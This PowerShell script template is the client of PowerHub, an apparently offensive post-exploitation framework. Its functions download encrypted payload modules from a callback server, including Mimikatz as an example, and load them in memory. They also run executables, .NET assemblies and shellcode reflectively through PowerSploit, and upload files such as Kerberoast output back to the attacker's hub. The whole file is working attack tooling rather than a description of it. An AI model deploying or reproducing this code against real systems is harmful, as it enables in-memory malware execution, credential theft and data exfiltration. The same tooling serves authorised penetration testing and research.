Write-Host @"
  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
 |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
 |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
                            written by Adrian Vollmer, 2018-2019
Run 'Help-PowerHub' for help
"@

$CALLBACK_URL = ${{symbol_name("CALLBACK_URL")}}
$KEY = ${{symbol_name("KEY")}}
Set-Alias -Name Decrypt-Code -Value {{symbol_name("Decrypt-Code")}}

$WEBDAV_URL = "{{webdav_url}}"
$ErrorActionPreference = "Stop"
$PS_VERSION = $PSVersionTable.PSVersion.Major

$Modules = @()
{% if modules %}
{% for m in modules %}
$m = new-object System.Collections.Hashtable
$m.add('name', '{{ m.name }}')
$m.add('shortname', '{{ m.short_name }}')
$m.add('type', '{{ m.type }}')
$m.add('code', '')
$m.add('n', {{ m.n }})
$Modules += $m
{% endfor %}
{% endif %}

function Unzip-Code {
     Param ( [byte[]] $byteArray )
     if ($PS_VERSION -eq 2) {
        $byteArray
     } else {
         $input = New-Object System.IO.MemoryStream( , $byteArray )
         $output = New-Object System.IO.MemoryStream
         $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
         $gzipStream.CopyTo( $output )
         $gzipStream.Close()
         $input.Close()
         [byte[]] $byteOutArray = $output.ToArray()
         $byteOutArray
    }
}


function Import-HubModule {

    Param(
        [parameter(Mandatory=$true)]
        $Module
    )

    if ($Module["type"] -eq "ps1") {
        $code = $Module["code"]
        $code = [System.Convert]::FromBase64String($code)
        $code = Decrypt-Code $code $KEY
        $code = Unzip-Code $code
        $code = [System.Text.Encoding]::ASCII.GetString($code)
        $sb = [Scriptblock]::Create($code)
        New-Module -ScriptBlock $sb | Out-Null
    }

    if ($?){
        Write-Host ("[*] {0} imported." -f $Module["name"])
    } else {
        Write-Host ("[*] Failed to import {0}" -f $Module["name"])
    }
}


function Convert-IntStringToArray ($s) {
    $no = $s.Split(",")
    $indices = @()
    foreach ($t in $no) {
        $limits = $t.Split("-")
        if ($limits.Length -eq 1) {
            $indices += $limits[0]
        } else {
            if (-not $limits[0]) { $limits[0] = 0}
            if (-not $limits[1]) { $limits[1] = $Modules.length-1}
            $indices += $limits[0] .. $limits[1]
        }
    }
    $indices
}

function List-HubModules {
<#
.SYNOPSIS

Lists all modules that are available via the hub.

#>
    $(foreach ($ht in $Modules) {
        new-object PSObject -Property $ht
    } ) | Format-Table -AutoSize -Property n,type,name,code
}

function Load-HubModule {

<#
.SYNOPSIS

Transfers a module from the hub and imports it. It creates a web request to
load the Base64 encoded module code.

.DESCRIPTION

Load-HubModule loads a module.

.PARAMETER s

Number of the module, separated by commas. Can contain a range such as "1,4-8".
Try a leading zero in case it is not working.

Alternatively, provide a regular expression. PowerHub will then load all
modules that match.

.EXAMPLE

Load-HubModule "3"

Description
-----------
Transfers the code of module #3 from the hub and imports it.

.EXAMPLE

Load-HubModule Mimikatz

Description
-----------
Transfers the code of module 'Invoke-Mimikatz.ps1' (because the regular
expression matches) from the hub and imports it.

.EXAMPLE

Load-HubModule "1,4-6"

Description
-----------
Transfers the code of modules #1, #4, #5 and #6 from the hub and imports them.

.EXAMPLE

Load-HubModule "-"

Description
-----------
Transfers the code of all modules from the hub and imports them.

.NOTES

Use the '-Verbose' option to print detailed information.
#>

    Param(
        [parameter(Mandatory=$true)]
        [String]
        $s
    )

    if ($s -match "^[0-9-,]+$") {
        $indices = Convert-IntStringToArray($s)
    } else {
        $indices = $Modules | Where { $_.shortname -match $s } | % {$_.n}
    }

    $K=new-object net.webclient;
    $K.proxy=[Net.WebRequest]::GetSystemWebProxy();
    $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
    foreach ($i in $indices) {
        if ($i -lt $Modules.length -and $i -ge 0) {
            $compression = "&c=1"
            if ($PS_VERSION -eq 2) { $compression = "" }
            $url = "{0}m?m={1}{2}" -f $CALLBACK_URL, $i, $compression
            $Modules[$i]["code"] = $K.downloadstring($url);
            Import-HubModule $Modules[$i]
        }
    }
}


function Run-Exe {
<#
.SYNOPSIS

Executes a loaded exe module in memory using Invoke-ReflectivePEInjection, which must be loaded first.

.EXAMPLE

Run-Exe 47

Description
-----------
Execute the exe module 47 in memory
#>
    Param(
        [parameter(Mandatory=$true)]
        [Int]
        $n
    )

    if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)
    {
        $code = $Modules[$n]["code"]
        $code = [System.Convert]::FromBase64String($code)
        $code = Decrypt-Code $code $KEY
        $code = Unzip-Code $code
        Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR
    } else {
        Write-Host "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
    }
}


function Run-DotNETExe {
<#
.SYNOPSIS

Executes a .NET exe module in memory, which must be loaded first.

.EXAMPLE

Load-HubModule SeatBelt
Run-DotNETExe 47 "system"

Description
-----------
Load and execute the .NET binary 47 in memory with the parameter "system"
#>

    Param(
        [parameter(Mandatory=$true)]
        [Int]
        $n,

        [parameter(Mandatory=$false)]
        [string[]] $Arguments

    )

    $code = $Modules[$n]["code"]
    $code = [System.Convert]::FromBase64String($code)
    $code = Decrypt-Code $code $KEY
    $code = Unzip-Code $code
    $a = [Reflection.Assembly]::Load([byte[]]$code)
    $al = New-Object -TypeName System.Collections.ArrayList
    $al.add($Arguments)
    $a.EntryPoint.Invoke($Null, $al.ToArray());
}


function Run-Shellcode {
<#
.SYNOPSIS

Executes a loaded shellcode module in memory using Invoke-Shellcode, which must be loaded first.

.EXAMPLE

Run-Shellcode 47

Description
-----------
Execute the shellcode module 47 in memory
#>
    Param(
        [parameter(Mandatory=$true)]
        [Int]
        $n,

        [ValidateNotNullOrEmpty()]
        [UInt16]
        $ProcessID
    )

    if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
    {
        $code = $Modules[$n]["code"]
        $code = [System.Convert]::FromBase64String($code)
        $code = Decrypt-Code $code $KEY
        $code = Unzip-Code $code
        if ($ProcessID) {
            Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
        } else {
            Invoke-Shellcode -Shellcode $code
        }
    } else {
        Write-Host "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
    }
}


function Send-File {
    Param(
       [Parameter(Mandatory=$True,Position=0)]
       [String]$Body,

       [Parameter(Mandatory=$False,Position=1)]
       [String[]]$FileName
    )

    if ($FileName) {
        # remove path
        try {
            $FileName = (Get-Item $Filename).Name
        } catch [System.Management.Automation.ItemNotFoundException] {
            $FileName = $FileName.Replace('^.', '').Replace('\', '_')
        }
    } else {
        $FileName = Get-Date -Format o
    }

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file[]`"; filename=`"$FileName`"",
        "Content-Type: application/octet-stream$LF",
        $Body,
        "--$boundary--$LF"
    ) -join $LF

    try {
        $response = Invoke-RestMethod -Uri $($CALLBACK_URL + "u") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
    } catch [System.Net.WebException] {
         if (-not $_.Exception.Message -match "401")  {throw $_}
    }
}


function PushTo-Hub {
<#
.SYNOPSIS

Uploads files back to the hub via Cmdlet.

.EXAMPLE

PushTo-Hub kerberoast.txt, users.txt

.EXAMPLE

Get-ChildItem | PushTo-Hub -Name "directory-listing"

Description
-----------
Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
#>
    Param(
       [Parameter(Mandatory=$False)]
       [String[]]$Files,

       [Parameter(Mandatory=$False)]
       [String[]]$Name,

       [Parameter(Mandatory=$False,ValueFromPipeline=$True)]
       $Stream
    )

    begin { $result = @() }
    process {
        $result = $result + $Stream
    }
    end {
        if ($result) {
            if ($result.length -eq 1 -and $result[0] -is [System.String]) {
                Send-File $result[0] $Name
            } else {
                $Body = $result | ConvertTo-Json
                Send-File $Body $Name
            }
        } else {
            ForEach ($file in $Files) {
                $abspath = (Resolve-Path $file).path
                $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
                if ($Name) { $filename = $name } else { $filename = $file }

                $fileEnc = $enc.GetString($fileBin)

                Send-File $fileEnc $filename

            }
        }
    }
}

$global:WebdavLetter = $Null

function Mount-Webdav {
<#
.SYNOPSIS

Mount the Webdav drive.

.PARAMETER Letter

The letter the mounted drive will receive (default: 'S')

#>
    Param(
        [parameter(Mandatory=$False)]
        [String]$Letter = "S"
    )
    Set-Variable -Name "WebdavLetter" -Value "$Letter" -Scope Global
    $netout = & net use ${Letter}: \\$WEBDAV_URL /persistent:no 2>&1 | Out-Null
    if (!$?) {
        throw "Error while executing 'net use': $netout"
    }
}


function Unmount-Webdav {
<#
.SYNOPSIS

Unmount the Webdav drive.

#>
    If (${WebdavLetter}) {
        $netout = & net use ${WebdavLetter}: /delete 2>&1 | Out-Null
        if (!$?) {
            throw "Error while executing 'net use': $netout"
        }
    } else {
        throw "No Webdav drive mounted"
    }
}

function Help-PowerHub {
    Write-Host @"
The following functions are available (some with short aliases):
  * List-HubModules (lshm)
  * Load-HubModule (lhm)
  * Run-Exe (re)
  * Run-DotNETExe (rdne)
  * Run-Shellcode (rsh)
  * PushTo-Hub (pth)
  * Mount-Webdav (mwd)
  * Unmount-Webdav (uwd)

Use 'Get-Help' to learn more about those functions.
"@
}

try { New-Alias -Name pth -Value PushTo-Hub } catch { }
try { New-Alias -Name lhm -Value Load-HubModule } catch { }
try { New-Alias -Name lshm -Value List-HubModules } catch { }
try { New-Alias -Name re -Value Run-Exe } catch { }
try { New-Alias -Name rdne -Value Run-DotNETExe } catch { }
try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
try { New-Alias -Name mwd -Value Mount-Webdav } catch { }
try { New-Alias -Name uwd -Value Unmount-Webdav } catch { }
